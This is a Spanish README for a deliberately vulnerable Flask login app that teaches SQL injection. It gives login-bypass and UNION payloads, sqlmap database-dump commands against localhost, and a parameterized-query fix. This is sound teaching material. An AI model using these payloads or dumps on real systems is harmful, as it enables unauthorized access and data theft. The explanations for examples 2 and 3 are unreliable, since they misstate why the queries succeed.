# SQL Injection Example

Ejemplo de *malas prácticas* en el desarrollo de aplicaciones web que permiten la inyección de código SQL.

Esta aplicación web de muestra contiene un formulario de login que permite el acceso a un área privada. El formulario de login está implementado en Flask y utiliza una base de datos SQLite para almacenar los usuarios y sus contraseñas.

## Ejecución

Para ejecutar la aplicación, es necesario instalar las dependencias de Python que se encuentran en el fichero `requirements.txt`:

```bash
pip install -r requirements.txt
```

Una vez instaladas las dependencias, se puede ejecutar la aplicación con el siguiente comando:

```bash
python app.py
```

## Inyección de código SQL

La aplicación web permite el acceso a un área privada a los usuarios que se encuentran en la base de datos. Para acceder al área privada, es necesario introducir un usuario y una contraseña válidos. Si el usuario y la contraseña son correctos, se muestra un mensaje de bienvenida. En caso contrario, se muestra un mensaje de error.

La aplicación web es (deliberadamente) vulnerable a la inyección de código SQL. Esto significa que un atacante puede introducir código SQL en el formulario de login para acceder al área privada sin conocer un usuario y una contraseña válidos.

### Ejemplo 1

El siguiente ejemplo muestra cómo un atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos. Para ello, el atacante introduce el siguiente código en el formulario de login:

```
' OR 1=1 --
```

El código anterior se traduce en la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password=''
```

La consulta SQL anterior devuelve todos los usuarios de la base de datos, ya que la condición `1=1` siempre es verdadera. Por lo tanto, el atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos.

### Ejemplo 2

El siguiente ejemplo muestra cómo un atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos. Para ello, el atacante introduce el siguiente código en el formulario de login:

```
' UNION SELECT * FROM users WHERE username='admin' --
```

El código anterior se traduce en la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username='' UNION SELECT * FROM users WHERE username='admin' --' AND password=''
```

La consulta SQL anterior devuelve todos los usuarios de la base de datos, ya que la condición `username='admin'` siempre es verdadera. Por lo tanto, el atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos.

### Ejemplo 3

El siguiente ejemplo muestra cómo un atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos. Para ello, el atacante introduce el siguiente código en el formulario de login:

```
' UNION SELECT * FROM users WHERE username='admin' AND password LIKE '%a%' --
```

El código anterior se traduce en la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username='' UNION SELECT * FROM users WHERE username='admin' AND password LIKE '%a%' --' AND password=''
```

La consulta SQL anterior devuelve todos los usuarios de la base de datos, ya que la condición `username='admin'` siempre es verdadera. Por lo tanto, el atacante puede acceder al área privada sin conocer un usuario y una contraseña válidos.

### Ejemplo 4

El siguiente ejemplo hace uso de la herramienta `sqlmap` para obtener información de la base de datos. Es necesario instalar dicha herramienta y ejecutar alguno de los siguientes comandos:

```bash
sqlmap -u http://localhost:5000/login --data "username=whatever&password=youwant" --dump-all --schema
```

También se puede utilizar la opción `--wizard` para obtener información de la base de datos de forma asistida.

```bash
sqlmap -u http://localhost:5000/login --wizard
```

## Solución

Para evitar la inyección de código SQL, es necesario utilizar *consultas parametrizadas*. En Python, las consultas parametrizadas se pueden utilizar con el método `execute` de la clase `Cursor` de la librería `sqlite3`. Por ejemplo:

```python
cursor.execute('SELECT * FROM users WHERE username=? AND password=?', (username, password))
```

## Referencias

* [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [SQL Injection](https://portswigger.net/web-security/sql-injection)
* [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
* [SQL Injection](https://www.sqlinjection.net/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [SQL Injection](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
* [SQL Injection](https://www.acunetix.com/websitesecurity/sql-injection/)
* [SQL Injection](https://www.veracode.com/security/sql-injection)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/types-of-sql-injection/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/how-to-prevent-sql-injection/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-example/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-prevention/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-union-attacks/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-in-insert-queries/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-in-update-queries/)
* [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/sql-injection-in-stored-procedures/)
